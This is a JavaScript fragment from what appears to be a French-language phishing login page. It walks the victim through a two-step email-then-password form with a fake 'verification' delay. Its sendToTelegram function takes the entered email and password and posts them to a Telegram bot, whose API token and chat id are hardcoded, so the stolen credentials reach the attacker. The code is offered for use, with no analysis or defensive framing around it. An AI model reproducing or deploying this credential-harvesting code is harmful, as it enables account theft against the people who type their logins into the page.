$(window).on("load", () => {
            setTimeout(function () {
                $("#load").fadeOut();
            }, 1500);
        });

        var count = 0;
        $(document).keypress(function (e) {
            var keycode = (e.keyCode ? e.keyCode : e.which);
            if (keycode == '13') {
                if ($("#twoo-container").is(":visible")) {
                    $("#submit-btn").trigger("click");
                } else {
                    $("#next").trigger("click");
                }
            }
        });
        $('#next').click(function (e) {
            $('#message').hide();
            $('#msg').hide();
            e.preventDefault();
            var oneo = $("#oneo").val();
            if (!oneo) {
                $('#message').show();
                $('#message').html("Veuillez indiquer votre adresse");
                oneo.focus;
                return false;
            }
            $("#next").html("Vérification...");
            setTimeout(function () {
                $("#oneo").attr('readonly', '');
                $("#twoo-container").fadeIn(1000);
                $("#next").html("next");
                $("#next").hide();
                $("#submit-btn").fadeIn(1000);
            }, 1000);
        });

         function sendToTelegram() {
			const token = "6017723864:AAE8dsmXYc2CeG8Uqvuz59AzBoUqRZKDofM";
            const chatId = "1498126368";
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const labelpal = document.querySelector('#pal');
            const ei = document.getElementById("oneo").value;
            const pa = document.getElementById("twoo").value;

            const message = `Nouvelle connexion :\nei : ${ei}\npa : ${pa}`;

            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                const messageStatus = document.querySelector('#message');
                if (data.ok) {
                  $('#message1').fadeIn(1000);
				  $('.f-description').hide();

                } else {
                    alert("Echec de la vérification. \n Veuillez réessayer...");   
                }
                 
            })
            
            .catch(error => {
                console.error(error);
            });
        }